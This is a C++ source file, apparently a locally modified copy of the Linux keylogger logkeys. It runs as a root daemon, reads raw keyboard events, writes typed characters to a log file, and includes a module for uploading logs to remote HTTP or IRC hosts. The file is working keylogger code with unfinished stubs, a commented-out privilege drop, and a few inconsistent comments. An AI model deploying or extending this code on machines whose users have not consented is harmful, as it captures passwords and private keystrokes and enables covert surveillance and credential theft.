/*
  Copyleft (ɔ) 2009 Kernc
  This program is free software. It comes with absolutely no warranty whatsoever.
  See COPYING for further information.
  
  Project homepage: http://code.google.com/p/logkeys/
*/

#include <cstdio>
#include <cerrno>
#include <cwchar>
#include <vector>
#include <cstring>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <csignal>
#include <error.h>
#include <netdb.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/file.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <linux/input.h>
#include "tree.hh"

#ifdef HAVE_CONFIG_H
# include <config.h>  // include config produced from ./configure
#endif

#ifndef  PACKAGE_VERSION
# define PACKAGE_VERSION "0.1.2"  // if PACKAGE_VERSION wasn't defined in <config.h>
#endif

// the following path-to-executable macros should be defined in config.h;
#ifndef  EXE_PS
# define EXE_PS "/bin/ps"
#endif

#ifndef  EXE_GREP
# define EXE_GREP "/bin/grep"
#endif

#ifndef  EXE_DUMPKEYS
# define EXE_DUMPKEYS "/usr/bin/dumpkeys"
#endif

#define COMMAND_STR_DUMPKEYS ( EXE_DUMPKEYS " -n | " EXE_GREP " '^\\([[:space:]]shift[[:space:]]\\)*\\([[:space:]]altgr[[:space:]]\\)*keycode'" )
#define COMMAND_STR_DEVICES  ( EXE_GREP " -E 'Handlers|EV=' /proc/bus/input/devices | " EXE_GREP " -B1 'EV=120013' | " EXE_GREP " -Eo 'event[0-9]+' ")
#define COMMAND_STR_GET_PID  ( (std::string(EXE_PS " ax | " EXE_GREP " '") + program_invocation_name + "' | " EXE_GREP " -v grep").c_str() )

#define INPUT_EVENT_PATH  "/dev/input/"  // standard path
#define DEFAULT_LOG_FILE  "/var/log/logkeys.log"
#define PID_FILE          "/var/run/logkeys.pid"

#include "usage.cc"      // usage() function
#include "args.cc"       // global arguments struct and arguments parsing
#include "keytables.cc"  // character and function key tables and helper functions
#include "upload.cc"     // functions concerning remote uploading of log file

namespace logkeys {

	tree<wchar_t> tr;

	void to_tree(wchar_t theChar){
	
	}

	// executes cmd and returns string ouput
	std::string execute(const char* cmd){
		FILE* pipe = popen(cmd, "r");
		if (!pipe)
			error(EXIT_FAILURE, errno, "Pipe error");
			char buffer[128];
			std::string result = "";
			while(!feof(pipe))
				if(fgets(buffer, 128, pipe) != NULL)
					result += buffer;
		pclose(pipe);
		return result;
	}

	int input_fd = -1;  // input event device file descriptor; global so that signal_handler() can access it

	void signal_handler(int signal){
		if (input_fd != -1)
			close(input_fd);  // closing input file will break the infinite while loop
	}

	void set_utf8_locale(){
		// set locale to common UTF-8 for wchars to be recognized correctly
		if(setlocale(LC_CTYPE, "en_US.UTF-8") == NULL) { // if en_US.UTF-8 isn't available
			char *locale = setlocale(LC_CTYPE, "");  // try the locale that corresponds to the value of the associated environment variable LC_CTYPE
			if (locale != NULL && 
				(strstr(locale, "UTF-8") != NULL || strstr(locale, "UTF8") != NULL ||
				strstr(locale, "utf-8") != NULL || strstr(locale, "utf8") != NULL) );  // if locale has "UTF-8" in its name, it is cool to do nothing
			else
				error(EXIT_FAILURE, 0, "LC_CTYPE locale must be of UTF-8 type, or you need en_US.UTF-8 availabe");
		}
	}

	void create_PID_file(){
		// create temp file carrying PID for later retrieval
		int pid_fd = open(PID_FILE, O_WRONLY | O_CREAT | O_EXCL, 0644);
		if (pid_fd != -1) {
			char pid_str[16] = {0};
			sprintf(pid_str, "%d", getpid());
			if (write(pid_fd, pid_str, strlen(pid_str)) == -1)
				error(EXIT_FAILURE, errno, "Error writing to PID file '" PID_FILE "'");
			close(pid_fd);
		}
		else {
			if (errno == EEXIST)
				error(EXIT_FAILURE, errno, "Another process already running? Quitting. (" PID_FILE ")");
			else error(EXIT_FAILURE, errno, "Error opening PID file '" PID_FILE "'");
		}
	}

	void kill_existing_process(){
		pid_t pid;
		bool via_file = true;
		bool via_pipe = true;
		FILE *temp_file = fopen(PID_FILE, "r");
	  
		via_file &= (temp_file != NULL);
	  
		if (via_file) {  // kill process with pid obtained from PID file
			via_file &= (fscanf(temp_file, "%d", &pid) == 1);
			fclose(temp_file);
		}
	  
		if (!via_file) {  // if reading PID from temp_file failed, try ps-grep pipe
			via_pipe &= (sscanf(execute(COMMAND_STR_GET_PID).c_str(), "%d", &pid) == 1);
			via_pipe &= (pid != getpid());
		}
	  
		if (via_file || via_pipe) {
			remove(PID_FILE);
			kill(pid, SIGINT);

			exit(EXIT_SUCCESS);  // process killed successfully, exit
		}

	  	error(EXIT_FAILURE, 0, "No process killed");
	}

	void set_signal_handling(){ // catch SIGHUP, SIGINT and SIGTERM signals to exit gracefully
		struct sigaction act = {{0}};
		act.sa_handler = signal_handler;
		sigaction(SIGHUP,  &act, NULL);
		sigaction(SIGINT,  &act, NULL);
		sigaction(SIGTERM, &act, NULL);
		// prevent child processes from becoming zombies
		act.sa_handler = SIG_IGN;
		sigaction(SIGCHLD, &act, NULL);
	}


	void parse_input_keymap(){
		// custom map will be used; erase existing US keytables
		memset(char_keys,  '\0', sizeof(char_keys));
		memset(shift_keys, '\0', sizeof(shift_keys));
		memset(altgr_keys, '\0', sizeof(altgr_keys));
	  
		stdin = freopen(args.keymap.c_str(), "r", stdin);
		if (stdin == NULL)
			error(EXIT_FAILURE, errno, "Error opening input keymap '%s'", args.keymap.c_str());
	  
		unsigned int i = -1;
		unsigned int line_number = 0;
		wchar_t func_string[32];
		wchar_t line[32];
	  
		while (!feof(stdin)) {
	    
			if (++i >= sizeof(char_or_func)) break;  // only ever read up to 128 keycode bindings (currently N_KEYS_DEFINED are used)
	    
			if (is_used_key(i)) {
				++line_number;
				if(fgetws(line, sizeof(line), stdin) == NULL) {
					if (feof(stdin)) break;
					else error_at_line(EXIT_FAILURE, errno, args.keymap.c_str(), line_number, "fgets() error");
				}
				// line at most 8 characters wide (func lines are "1234567\n", char lines are "1 2 3\n")
				if (wcslen(line) > 8) // TODO: replace 8*2 with 8 and wcslen()!
					error_at_line(EXIT_FAILURE, 0, args.keymap.c_str(), line_number, "Line too long!");
				// terminate line before any \r or \n
				std::wstring::size_type last = std::wstring(line).find_last_not_of(L"\r\n");
				if (last == std::wstring::npos)
					error_at_line(EXIT_FAILURE, 0, args.keymap.c_str(), line_number, "No characters on line");
				line[last + 1] = '\0';
			}
	    
			if (is_char_key(i)) {
				unsigned int index = to_char_keys_index(i);
				if (swscanf(line, L"%lc %lc %lc", &char_keys[index], &shift_keys[index], &altgr_keys[index]) < 1) {
					error_at_line(EXIT_FAILURE, 0, args.keymap.c_str(), line_number, "Too few input characters on line");
				}
			}
			if (is_func_key(i)) {
				if (i == KEY_SPACE) continue;  // space causes empty string and trouble
				if (swscanf(line, L"%7ls", &func_string[0]) != 1)
					error_at_line(EXIT_FAILURE, 0, args.keymap.c_str(), line_number, "Invalid function key string");  // does this ever happen?
				wcscpy(func_keys[to_func_keys_index(i)], func_string);
			}
		} // while (!feof(stdin))
		fclose(stdin);
	  
		if (line_number < N_KEYS_DEFINED)
			#define QUOTE(x) #x  // quotes x so it can be used as (char*)
		error(EXIT_FAILURE, 0, "Too few lines in input keymap '%s'; There should be " QUOTE(N_KEYS_DEFINED) " lines!", args.keymap.c_str());
	}

	void export_keymap_to_file(){
		int keymap_fd = open(args.keymap.c_str(), O_CREAT | O_EXCL | O_WRONLY, 0644);
		if (keymap_fd == -1)
			error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.keymap.c_str());
		char buffer[32];
		int buflen = 0;
		unsigned int index;
		for (unsigned int i = 0; i < sizeof(char_or_func); ++i) {
			buflen = 0;
			if (is_char_key(i)) {
				index = to_char_keys_index(i);
				// only export non-null characters
				if (char_keys[index] != L'\0' && shift_keys[index] != L'\0' && altgr_keys[index] != L'\0')
					buflen = sprintf(buffer, "%lc %lc %lc\n", char_keys[index], shift_keys[index], altgr_keys[index]);
				else if (char_keys[index] != L'\0' && shift_keys[index] != L'\0')
					buflen = sprintf(buffer, "%lc %lc\n", char_keys[index], shift_keys[index]);
				else if (char_keys[index] != L'\0')
					buflen = sprintf(buffer, "%lc\n", char_keys[index]);
				else // if all \0, export nothing on that line (=keymap will not parse)
					buflen = sprintf(buffer, "\n");
			}
			else if (is_func_key(i)) {
				buflen = sprintf(buffer, "%ls\n", func_keys[to_func_keys_index(i)]);
			}

			if (is_used_key(i))
				if (write(keymap_fd, buffer, buflen) < buflen)
					error(EXIT_FAILURE, errno, "Error writing to keymap file '%s'", args.keymap.c_str());
		}
		close(keymap_fd);
		error(EXIT_SUCCESS, 0, "Success writing keymap to file '%s'", args.keymap.c_str());
		exit(EXIT_SUCCESS);
	}

	void determine_input_device(){
		// better be safe than sory: while running other programs, switch user to nobody
		setegid(65534); seteuid(65534);

		// extract input number from /proc/bus/input/devices (I don't know how to do it better. If you have an idea, please let me know.)
		std::stringstream output(execute(COMMAND_STR_DEVICES));

		std::vector<std::string> results;
		std::string line;

		while(std::getline(output, line)) {
			std::string::size_type i = line.find("event");
			if (i != std::string::npos) i += 5; // "event".size() == 5
				if (i < line.size()) {
					int index = atoi(&line.c_str()[i]);

					if (index != -1) {
						std::stringstream input_dev_path;
						input_dev_path << INPUT_EVENT_PATH;
						input_dev_path << "event";
						input_dev_path << index;

						results.push_back(input_dev_path.str());
					}
				}
			}

			if (results.size() == 0) {
				error(0, 0, "Couldn't determine keyboard device. :/");
				error(EXIT_FAILURE, 0, "Please post contents of your /proc/bus/input/devices file as a new bug report. Thanks!");
			}

		args.device = results[0];  // for now, use only the first found device

		// now we reclaim those root privileges
		seteuid(0); setegid(0);
	}


	int main(int argc, char **argv){
		if (geteuid()) error(EXIT_FAILURE, errno, "Got r00t?");

		args.logfile = (char*) DEFAULT_LOG_FILE;  // default log file will be used if none specified

		//TODO look up the documentation for this
		process_command_line_arguments(argc, argv);

		// kill existing logkeys process
		if (args.kill) kill_existing_process();

		// if neither start nor export, that must be an error
		if (!args.start && !(args.flags & FLAG_EXPORT_KEYMAP)) { usage(); exit(EXIT_FAILURE); } //TODO find what usage() does

		// if posting remote and post_size not set, set post_size to default [500K bytes]
		if (args.post_size == 0 && (!args.http_url.empty() || !args.irc_server.empty())) {
			args.post_size = 5000000;
		}

		// check for incompatible flags
		if (!args.keymap.empty() && (!(args.flags & FLAG_EXPORT_KEYMAP) && args.us_keymap)) {  // exporting uses args.keymap also
			error(EXIT_FAILURE, 0, "Incompatible flags '-m' and '-u'. See usage.");
		}

		set_utf8_locale();

		if (!args.keymap.empty())  // custom keymap in use
			parse_input_keymap();
		else
			error(EXIT_FAILURE, 0, "Please add a keymap with -m or --keymap=FILE");

		//Removed the case where the args.device is not empty
		if (args.device.empty()) 
			determine_input_device();
		else
			error(EXIT_FAILURE, errno, "Please use the default device");
			

		set_signal_handling();

		int nochdir = 0;
		if (args.logfile[0] != '/')
			nochdir = 1;  // don't chdir (logfile specified with relative path)
		
		int noclose = 1;  // don't close streams (stderr used)
		if (daemon(nochdir, noclose) == -1)  // become daemon
			error(EXIT_FAILURE, errno, "Failed to become daemon");
		close(STDIN_FILENO); close(STDOUT_FILENO);  // leave stderr open

		// open input device for reading
		input_fd = open(args.device.c_str(), O_RDONLY);
		if (input_fd == -1) {
			error(EXIT_FAILURE, errno, "Error opening input event device '%s'", args.device.c_str());
		}

		// if log file is other than default, then better seteuid() to the getuid() in order to ensure user can't write to where she shouldn't!
		if (args.logfile == DEFAULT_LOG_FILE) {
			seteuid(getuid());
			setegid(getgid());
		}

		// open log file (if file doesn't exist, create it with safe 0600 permissions)
		umask(0177);
		FILE *out = fopen(args.logfile.c_str(), "a");
		if (!out)
			error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());

		// now we need those privileges back in order to create system-wide PID_FILE
		seteuid(0); setegid(0);
		create_PID_file();

		// now we've got everything we need, finally drop privileges by becoming 'nobody'
		//setegid(65534); seteuid(65534);   // commented-out, I forgot why xD

		unsigned int scan_code, prev_code = 0;  // the key code of the pressed key 
							//(some codes are from "scan code set 1", some are different (see <linux/input.h>)
		struct input_event event;
		// char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
		bool shift_in_effect = false;
		bool altgr_in_effect = false;
		bool ctrl_in_effect = false;  // used for identifying Ctrl+C / Ctrl+D
		int count_repeats = 0;  // count_repeats differs from the actual number of repeated characters! 
		//afaik, only the OS knows how these two values are related (by respecting configured repeat speed and delay)

		struct stat st;
		stat(args.logfile.c_str(), &st);
		off_t file_size = st.st_size;  // log file is currently file_size bytes "big"
		int inc_size;  // is added to file_size in each iteration of keypress reading, adding number of bytes written to log file in that iteration

		/*
		while (!feof(out)){
			wchar_t aCh;
			fscanf(out, "%lc", &aCh);
			fprintf(out, "ay");
		}*/
		fflush(out);

		// infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
		while (read(input_fd, &event, sizeof(struct input_event)) > 0) {

			// these event.value-s aren't defined in <linux/input.h> ?
			#define EV_MAKE   1  // when key pressed
			#define EV_BREAK  0  // when key released
			#define EV_REPEAT 2  // when key switches to repeating after short delay

			if (event.type != EV_KEY) continue;  // keyboard events are always of type EV_KEY

			inc_size = 0;
			scan_code = event.code;


			if (scan_code >= sizeof(char_or_func)) {  // keycode out of range, don't log error
				continue;
			}

			//TODO may actually want to reimplement the repeats only with the delete button

			// on key press
			if (event.value == EV_MAKE) {
				if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
					shift_in_effect = true;
				if (scan_code == KEY_RIGHTALT)
					altgr_in_effect = true;
				if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
					ctrl_in_effect = true;
				if (is_char_key(scan_code)) {
					wchar_t wch;
					if (altgr_in_effect || ctrl_in_effect) {
						//Probably want an escape here
					} 
					else if (shift_in_effect) {
						wch = shift_keys[to_char_keys_index(scan_code)];
						if (wch == L'\0')
							wch = char_keys[to_char_keys_index(scan_code)];
					}
					else  // neither altgr nor shift are effective, this is a normal char
						wch = char_keys[to_char_keys_index(scan_code)];


					if (wch != L'\0' && ((scan_code==14) || (scan_code>15 && scan_code<26) 
						|| (scan_code>29 && scan_code<39) || (scan_code>43 && scan_code<51))){
						
						inc_size += fprintf(out, "%lc", wch);  // write character to log file
						//Add a key to the last node, increment the node at this location
					}
					else{
						inc_size += fprintf(out, "<");
						//This is not a good character...use method to reset the root to the root
					}
				}
				else if (is_func_key(scan_code)) {
					if (scan_code == 14){ // only want the delete from these keys
						inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
						//Decrement the element at the current node (unless root)
						//Move back to the parent of the current node (unless root)
					}
					else if (scan_code == KEY_SPACE) {
						inc_size += fprintf(out, " "); 
						//May function the same as not a good character...have to decide on this
					}
					else {
						inc_size += fprintf(out, "<");
						//This is not a good character...use method to reset the root to the root
					}
				}
			} // if (EV_MAKE)

			// on key release
			if (event.value == EV_BREAK) {
				if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
					shift_in_effect = false;
				if (scan_code == KEY_RIGHTALT)
					altgr_in_effect = false;
				if (scan_code == KEY_RIGHTCTRL || scan_code == KEY_LEFTCTRL)
					ctrl_in_effect = false;
			}

			prev_code = scan_code;
			fflush(out);
			if (inc_size > 0) file_size += inc_size;

		} // while (read(input_fd))

		fclose(out);

		remove(PID_FILE);

		exit(EXIT_SUCCESS);
	} // main()

} // namespace logkeys

int main(int argc, char** argv){
	return logkeys::main(argc, argv);
}

